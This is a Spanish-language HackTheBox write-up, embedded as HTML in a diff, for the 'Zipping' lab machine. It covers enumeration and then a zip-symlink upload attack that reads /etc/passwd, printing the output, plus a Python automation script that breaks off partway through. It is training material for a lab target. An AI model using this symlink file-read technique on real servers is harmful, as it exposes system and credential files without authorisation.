@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Writeup Zipping</title>
+ <link rel="stylesheet" href="/assets/css/styles_machine.css" />
+ <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
+ <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
+ <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">    
+</head>
+<body>
+  <div class="menu">
+    <div id="mySidepanel" class="sidepanel">
+        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
+        <a href="/htb">HackTheBox</a>
+        <a href="/">Home</a>
+        <a href="https://mrpr1ngl3s.github.io/blog">Blog</a>
+    </div>
+    
+    <button class="openbtn" onclick="openNav()">☰</button>  
+</div>
+<script>
+function openNav() {
+if (window.innerWidth <= 1000) {
+    document.getElementById("mySidepanel").style.display = "block";
+} else {
+    document.getElementById("mySidepanel").style.width = "25%";
+}
+}
+
+function closeNav() {
+if (window.innerWidth <= 1000) {
+    document.getElementById("mySidepanel").style.display = "none";
+} else {
+    document.getElementById("mySidepanel").style.width = "0";
+}
+
+}
+
+</script>
+
+  <div class="main">
+<a href="https://app.hackthebox.com/machines/Zipping/"  target="_blank"><img style="float: right; margin-left:60px; height:90px;" src="/img/Zipping.png"/></a>
+
+<h1 id="zipping">Zipping</h1>
+<h2 id="enumeración">Enumeración</h2>
+<p>Iniciamos con la máquina comprobando la conectividad realizando un <strong>ping</strong> a la IP <strong>10.10.11.229</strong> .</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>❯ <span class="fu">ping</span> -c 1 10.10.11.229</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">PING</span> 10.10.11.229 (10.10.11.229) <span class="ex">56</span>(84) <span class="ex">bytes</span> of data.</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">64</span> bytes from 10.10.11.229: icmp_seq=1 ttl=63 time=52.7 ms</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">---</span> 10.10.11.229 ping statistics ---</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">1</span> packets transmitted, 1 received, 0% packet loss, time 0ms</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">rtt</span> min/avg/max/mdev = 52.656/52.656/52.656/0.000 ms</span></code></pre></div>
+<p>En el output del comando ejecutado en el parámetro <strong>ttl</strong> se ve que el valor está más cerca del <strong>64</strong> que del <strong>128</strong>, gracias a este parámetro se puede saber el sistema operativo que se está utilizando, en este caso un Linux.</p>
+<table>
+<thead>
+<tr class="header">
+<th>TTL</th>
+<th>OS</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>64</td>
+<td>GNU/Linux</td>
+</tr>
+<tr class="even">
+<td>128</td>
+<td>Windows</td>
+</tr>
+</tbody>
+</table>
+<p>Vamos a utilizar la herramienta <strong>Nmap</strong> para escanear los puertos que estén abiertos y los servicios que están asociados a estos.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a> <span class="fu">nmap</span> -p- --open -sCV -n --min-rate 5000 -Pn 10.10.11.229 -oN Scan</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 8%" />
+<col style="width: 91%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-p-</td>
+<td>Indica que analice todos los puertos del 1 al 65535</td>
+</tr>
+<tr class="even">
+<td>–open</td>
+<td>Únicamente se escanearan los puertos que estén abiertos</td>
+</tr>
+<tr class="odd">
+<td>-sC</td>
+<td>Lanza scripts que tiene Nmap por defecto para detectar el tipo de servicio que este corriendo en un puerto</td>
+</tr>
+<tr class="even">
+<td>-sV</td>
+<td>Lanza scripts que tiene Nmap para saber que versión están utilizando los servicios</td>
+</tr>
+<tr class="odd">
+<td>-n</td>
+<td>Se evita realizar resolución DNS</td>
+</tr>
+<tr class="even">
+<td>–min-rate</td>
+<td>Indica la cantidad de paquetes que se envían por segundo, en este caso 5000</td>
+</tr>
+<tr class="odd">
+<td>-Pn</td>
+<td>Deshabilita la búsqueda del host, solamente manda los paquetes a los puertos.</td>
+</tr>
+<tr class="even">
+<td>-oN</td>
+<td>Exporta el output del comando ejecutado a un archivo en formato nmap</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="co"># Nmap 7.93 scan initiated Sat Apr 27 09:14:30 2024 as: nmap -p- --open -sCV -n --min-rate 5000 -Pn -oN Scan 10.10.11.229</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 10.10.11.229</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="ex">Host</span> is up (0.041s latency)<span class="ex">.</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="ex">Not</span> shown: 65533 closed tcp ports (reset)</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0)</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssh-hostkey</span>: </span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">256</span> 9d6eec022d0f6a3860c6aaac1ee0c284 (ECDSA)</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  256 eb9511c7a6faad74aba2c5f6a4021841 (ED25519)</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a><span class="ex">80/tcp</span> open  http    Apache httpd 2.4.54 ((Ubuntu))</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: Zipping <span class="kw">|</span> <span class="ex">Watch</span> store</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: Apache/2.4.54 (Ubuntu)</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a><span class="co"># Nmap done at Sat Apr 27 09:14:49 2024 -- 1 IP address (1 host up) scanned in 19.42 seconds</span></span></code></pre></div>
+<p>Los puertos que se han descubierto son:</p>
+<table>
+<thead>
+<tr class="header">
+<th>Puertos</th>
+<th>Servicio</th>
+<th>Versión</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 9.0p1</td>
+</tr>
+<tr class="even">
+<td>80</td>
+<td>HTTP</td>
+<td>Apache httpd 2.4.54</td>
+</tr>
+</tbody>
+</table>
+<h2 id="búsqueda-de-vulnerabilidades">Búsqueda de Vulnerabilidades</h2>
+<p>Viendo que esta el puerto 80 abierto tratamos de acceder a la pagina.</p>
+
+<!-- Pandoc -->
+    
+<!-- \[\[(.*?)\]\] | <img src="Img/$1"> -->
+
+<!-- <p\b[^>]*>(?=[\s\S]*<img\b[^>]*>)([\s\S]*?)<\/p> | $1 -->
+
+<img src="Img/Pasted image 20240427093344.png">
+<p>Vemos un botón que pone “Work with Us”.</p>
+<img src="Img/Pasted image 20240427093530.png">
+<p>Al acceder vemos que podemos subir un archivos <strong>.zip</strong> los cuales deben contener un archivo <strong>.pdf</strong>.</p>
+<img src="Img/Pasted image 20240427093606.png">
+<p>Si tratamos de crear el .zip con un archivo PHP y lo interceptamos con <strong>BurpSuite</strong> para tratar de ver si podemos tratar de subir el archivo .</p>
+<img src="Img/Pasted image 20240428091944.png">
+<img src="Img/Pasted image 20240428092108.png">
+<img src="Img/Pasted image 20240428092233.png">
+<img src="Img/Pasted image 20240428092302.png">
+<img src="Img/Pasted image 20240428092535.png">
+<p>Al cambiar una de las extensiones nos funciona.</p>
+<img src="Img/Pasted image 20240428092507.png">
+<p>Vemos que nos muestra la ruta <strong>/uploads/</strong> .</p>
+<img src="Img/Pasted image 20240428092601.png">
+<img src="Img/Pasted image 20240428092744.png">
+<p>Al acceder al PDF no vemos nada.</p>
+<img src="Img/Pasted image 20240428092914.png">
+<p>Al pasar un rato el PDF desaparece.</p>
+<img src="Img/Pasted image 20240428093035.png">
+<p>Viendo otras rutas vemos que en <strong>/shop</strong> hay diferentes productos.</p>
+<img src="Img/Pasted image 20240427135106.png">
+<img src="Img/Pasted image 20240427135547.png">
+<p>Vamos a utilizar la herramienta <strong>gobuster</strong> para ver los archivos y directorios dentro de la ruta <strong>/shop</strong> .</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="ex">gobuster</span> dir -u <span class="st">&quot;http://10.10.11.229/shop&quot;</span> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -o directories.txt</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 11%" />
+<col style="width: 88%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>dir</td>
+<td>Utiliza el modo de enumeración de directorios y archivos.</td>
+</tr>
+<tr class="even">
+<td>-u</td>
+<td>Especifica la URL a la cual se quiere escanear.</td>
+</tr>
+<tr class="odd">
+<td>-w</td>
+<td>Especifica el diccionario que se utilizara parar el escaneo.</td>
+</tr>
+<tr class="even">
+<td>-x</td>
+<td>Indica las extensiones de archivo que se desean descubrir durante el escaneo.</td>
+</tr>
+<tr class="odd">
+<td>-o</td>
+<td>Se indica que se quiere guardar el resultado en un archivo.</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a>===============================================================</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="ex">Gobuster</span> v3.1.0</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a><span class="ex">by</span> OJ Reeves (@TheColonial) <span class="kw">&amp;</span> <span class="ex">Christian</span> Mehlmauer (@firefart)</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a>===============================================================</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a>[<span class="ex">+</span>] Url:                     http://10.10.11.229/shop</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a>[<span class="ex">+</span>] Method:                  GET</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a>[<span class="ex">+</span>] Threads:                 10</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a>[<span class="ex">+</span>] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true"></a>[<span class="ex">+</span>] Negative Status codes:   404</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true"></a>[<span class="ex">+</span>] User Agent:              gobuster/3.1.0</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true"></a>[<span class="ex">+</span>] Extensions:              html,php,txt</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true"></a>[<span class="ex">+</span>] Timeout:                 10s</span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true"></a>===============================================================</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true"></a><span class="ex">2024/04/27</span> 13:58:07 Starting gobuster in directory enumeration mode</span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true"></a>===============================================================</span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true"></a><span class="ex">/index.php</span>            (Status: 200) [<span class="ex">Size</span>: 2615]</span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true"></a><span class="ex">/home.php</span>             (Status: 500) [<span class="ex">Size</span>: 0]   </span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true"></a><span class="ex">/products.php</span>         (Status: 500) [<span class="ex">Size</span>: 0]   </span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true"></a><span class="ex">/product.php</span>          (Status: 200) [<span class="ex">Size</span>: 15]  </span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true"></a><span class="ex">/assets</span>               (Status: 301) [<span class="ex">Size</span>: 318] [--<span class="op">&gt;</span> http://10.10.11.229/shop/assets/]</span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true"></a><span class="ex">/cart.php</span>             (Status: 500) [<span class="ex">Size</span>: 1]                                         </span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true"></a><span class="ex">/functions.php</span>        (Status: 200) [<span class="ex">Size</span>: 0]                                         </span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true"></a><span class="ex">Progress</span>: 30844 / 882244 (3.50%)                                                     ^<span class="ex">C</span></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true"></a>[!] <span class="ex">Keyboard</span> interrupt detected, terminating.</span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true"></a>                                                                                      </span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true"></a>===============================================================</span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true"></a><span class="ex">2024/04/27</span> 13:59:57 Finished</span>
+<span id="cb5-28"><a href="#cb5-28" aria-hidden="true"></a>===============================================================</span></code></pre></div>
+<img src="Img/Pasted image 20240427140751.png">
+<p>Viendo las diferentes rutas, vemos que en la ruta <strong>product.php</strong> sale lo siguiente.</p>
+<img src="Img/Pasted image 20240427140923.png">
+<p>Si tratamos de ver el código fuente del archivo no nos funciona.</p>
+<img src="Img/Pasted image 20240427164224.png">
+<p>Ya que podemos agregar un archivo al sistema y acceder a este, podríamos tratar de crear un enlace simbólico hacia la ruta <strong>/product.php</strong> .</p>
+<p>Para realizar una prueba, intentaremos ver el contenido de <strong>/etc/passwd</strong> utilizando el comando <strong>ln</strong> .</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a>❯ <span class="fu">ln</span> -s /etc/passwd shell.pdf</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetro</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-s</td>
+<td>Crea un enlace simbólico en lugar de un enlace físico.</td>
+</tr>
+</tbody>
+</table>
+<p>Teniendo ya el archivo PDF creado con su enlace simbólico, procedemos a crear el archivo ZIP .</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a>❯ <span class="fu">zip</span> --symlinks shell.zip shell.pdf</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a>  <span class="ex">adding</span>: shell.pdf (stored 0%)</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>–symlinks</td>
+<td>Permite incluir enlaces simbólicos dentro del archivo ZIP</td>
+</tr>
+</tbody>
+</table>
+<p>Si subimos el archivo y accedemos no vemos nada.</p>
+<img src="Img/Pasted image 20240427171142.png">
+<p>Pero si utilizamos <strong>curl</strong> para ver el codigo fuente, vemos el contenido del archivo <strong>/etc/passwd</strong> .</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a>❯ <span class="ex">curl</span> -s -X GET <span class="st">&quot;http://10.10.11.229/uploads/d2449f87bdf334c6189f5f5bc0b40083/shell.pdf&quot;</span></span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 9%" />
+<col style="width: 90%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-s</td>
+<td>Indica que en el output no se mostrara el mensaje de progreso que se muestra durante una solicitud.</td>
+</tr>
+<tr class="even">
+<td>-X</td>
+<td>El tipo de método que se utilizara en la solicitud POST, GET etc.</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="ex">root</span>:x:0:0:root:/root:/bin/bash</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a><span class="ex">daemon</span>:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a><span class="ex">bin</span>:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a><span class="ex">sys</span>:x:3:3:sys:/dev:/usr/sbin/nologin</span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a><span class="ex">sync</span>:x:4:65534:sync:/bin:/bin/sync</span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a><span class="ex">games</span>:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true"></a><span class="ex">man</span>:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true"></a><span class="ex">lp</span>:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true"></a><span class="ex">mail</span>:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true"></a><span class="ex">news</span>:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true"></a><span class="ex">uucp</span>:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true"></a><span class="ex">proxy</span>:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true"></a><span class="ex">www-data</span>:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true"></a><span class="ex">backup</span>:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
+<span id="cb9-15"><a href="#cb9-15" aria-hidden="true"></a><span class="ex">list</span>:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
+<span id="cb9-16"><a href="#cb9-16" aria-hidden="true"></a><span class="ex">irc</span>:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span>
+<span id="cb9-17"><a href="#cb9-17" aria-hidden="true"></a><span class="ex">nobody</span>:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
+<span id="cb9-18"><a href="#cb9-18" aria-hidden="true"></a><span class="ex">_apt</span>:x:100:65534::/nonexistent:/usr/sbin/nologin</span>
+<span id="cb9-19"><a href="#cb9-19" aria-hidden="true"></a><span class="ex">systemd-network</span>:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span>
+<span id="cb9-20"><a href="#cb9-20" aria-hidden="true"></a><span class="ex">systemd-timesync</span>:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span>
+<span id="cb9-21"><a href="#cb9-21" aria-hidden="true"></a><span class="ex">messagebus</span>:x:103:109::/nonexistent:/usr/sbin/nologin</span>
+<span id="cb9-22"><a href="#cb9-22" aria-hidden="true"></a><span class="ex">systemd-resolve</span>:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span>
+<span id="cb9-23"><a href="#cb9-23" aria-hidden="true"></a><span class="ex">pollinate</span>:x:105:1::/var/cache/pollinate:/bin/false</span>
+<span id="cb9-24"><a href="#cb9-24" aria-hidden="true"></a><span class="ex">sshd</span>:x:106:65534::/run/sshd:/usr/sbin/nologin</span>
+<span id="cb9-25"><a href="#cb9-25" aria-hidden="true"></a><span class="ex">rektsu</span>:x:1001:1001::/home/rektsu:/bin/bash</span>
+<span id="cb9-26"><a href="#cb9-26" aria-hidden="true"></a><span class="ex">mysql</span>:x:107:115:MySQL Server,,,:/nonexistent:/bin/false</span>
+<span id="cb9-27"><a href="#cb9-27" aria-hidden="true"></a><span class="ex">_laurel</span>:x:999:999::/var/log/laurel:/bin/false</span></code></pre></div>
+<p>Pero al cabo de un rato el archivo es eliminado nuevamente.</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a>❯ <span class="ex">curl</span> -s -X GET <span class="st">&quot;http://10.10.11.229/uploads/d2449f87bdf334c6189f5f5bc0b40083/shell.pdf&quot;</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a><span class="op">&lt;</span>!<span class="ex">DOCTYPE</span> HTML PUBLIC <span class="st">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span><span class="op">&gt;</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">html</span><span class="op">&gt;&lt;</span>head<span class="op">&gt;</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">title</span><span class="op">&gt;</span>404 Not Found<span class="op">&lt;</span>/title<span class="op">&gt;</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a><span class="op">&lt;</span>/<span class="ex">head</span><span class="op">&gt;&lt;</span>body<span class="op">&gt;</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">h1</span><span class="op">&gt;</span>Not Found<span class="op">&lt;</span>/h1<span class="op">&gt;</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">p</span><span class="op">&gt;</span>The requested URL was not found on this server.<span class="op">&lt;</span>/p<span class="op">&gt;</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">hr</span><span class="op">&gt;</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">address</span><span class="op">&gt;</span>Apache/2.4.54 (Ubuntu) <span class="ex">Server</span> at 10.10.11.229 Port <span class="op">80&lt;</span>/address<span class="op">&gt;</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true"></a><span class="op">&lt;</span>/<span class="ex">body</span><span class="op">&gt;&lt;</span>/html<span class="op">&gt;</span></span></code></pre></div>
+<p>Por lo que para no estar todo el rato creando diferentes archivos ZIP, lo automatizaremos todo con un script.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="co">#!/usr/bin/python3  </span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a><span class="im">import</span> os, requests, time  </span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true"></a><span class="im">from</span> bs4 <span class="im">import</span> BeautifulSoup  </span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true"></a><span class="im">import</span> argparse  </span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true"></a>  </span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true"></a><span class="kw">def</span> arguments():  </span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true"></a>    parser <span class="op">=</span> argparse.ArgumentParser(description<span class="op">=</span><span class="st">&#39;Local File Inclusion (LFI)&#39;</span>)  </span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true"></a>    parser.add_argument(<span class="st">&#39;-f&#39;</span>,<span class="st">&#39;--file&#39;</span>, dest<span class="op">=</span><span class="st">&#39;file&#39;</span>, required<span class="op">=</span><span class="va">True</span>, <span class="bu">type</span><span class="op">=</span><span class="bu">str</span>, <span class="bu">help</span><span class="op">=</span><span class="st">&#39;file you want to show&#39;</span>)  </span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true"></a>    <span class="cf">return</span> parser.parse_args()  </span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true"></a>  </span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true"></a><span class="kw">def</span> makeRequest(<span class="bu">file</span>):  </span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true"></a>    url <span class="op">=</span> <span class="st">&quot;http://10.10.11.229&quot;</span>  </span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true"></a>  </span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true"></a>    <span class="cf">if</span> os.path.exists(<span class="st">&quot;shell.pdf&quot;</span>):  </span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true"></a>        os.remove(<span class="st">&quot;shell.pdf&quot;</span>)  </span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true"></a>  </span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true"></a>    <span class="cf">if</span> os.path.exists(<span class="st">&quot;shell.zip&quot;</span>):  </span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true"></a>        os.remove(<span class="st">&quot;shell.zip&quot;</span>)  </span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true"></a>  </span>
+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true"></a>    <span class="bu">print</span>(<span class="st">&quot;Creando enlace simbolico...&quot;</span>)  </span>
+<span id="cb11-21"><a href="#cb11-21" aria-hidden="true"></a>    time.sleep(<span class="dv">1</span>)  </span>
+<span id="cb11-22"><a href="#cb11-22" aria-hidden="true"></a>    os.system(<span class="ss">f&quot;ln -s </span><span class="sc">{</span><span class="bu">file</span><span class="sc">}</span><span class="ss"> shell.pdf&quot;</span>)  </span>
+<span id="cb11-23"><a href="#cb11-23" aria-hidden="true"></a>  </span>
+<span id="cb11-24"><a href="#cb11-24" aria-hidden="true"></a>    <span class="bu">print</span>(<span class="st">&quot;Creando fichero ZIP...&quot;</span>)  </span>
+<span id="cb11-25"><a href="#cb11-25" aria-hidden="true"></a>    time.sleep(<span class="dv">1</span>)  </span>
+<span id="cb11-26"><a href="#cb11-26" aria-hidden="true"></a>    os.system(<span class="st">&quot;zip --symlinks shell.zip shell.pdf 1&gt;/dev/null&quot;</span>)  </span>
+<span id="cb11-27"><a href="#cb11-27" aria-hidden="true"></a>  </span>
+<span id="cb11-28"><a href="#cb11-28" aria-hidden="true"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;shell.zip&quot;</span>, <span class="st">&quot;rb&quot;</span>) <span class="im">as</span> archivo:  </span>
+<span id="cb11-29"><a href="#cb11-29" aria-hidden="true"></a>        file_zip <span class="op">=</span> {<span class="st">&quot;zipFile&quot;</span>: (<span class="st">&quot;shell.zip&quot;</span>, archivo, <span class="st">&quot;application/zip&quot;</span>), <span class="st">&#39;submit&#39;</span>: (<span class="va">None</span>, <span class="st">&#39;&#39;</span>)}  </span>
+<span id="cb11-30"><a href="#cb11-30" aria-hidden="true"></a>  </span>
+<span id="cb11-31"><a href="#cb11-31" aria-hidden="true"></a>        headers <span class="op">=</span> {<span class="st">&quot;Host&quot;</span>: <span class="st">&quot;10.10.11.229&quot;</span>, <span class="st">&quot;User-Agent&quot;</span>: <span class="st">&quot;Mozilla/5.0 (X11;Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span>}  </span>
+<span id="cb11-32"><a href="#cb11-32" aria-hidden="true"></a>  </span>
+<span id="cb11-33"><a href="#cb11-33" aria-hidden="true"></a>        s <span class="op">=</span> requests.Session()  </span>
+<span id="cb11-34"><a href="#cb11-34" aria-hidden="true"></a>  </span>
+<span id="cb11-35"><a href="#cb11-35" aria-hidden="true"></a>        r <span class="op">=</span> s.post(<span class="ss">f&quot;</span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">/upload.php&quot;</span>, files<span class="op">=</span>file_zip)  </span>
+<span id="cb11-36"><a href="#cb11-36" aria-hidden="true"></a>  </span>
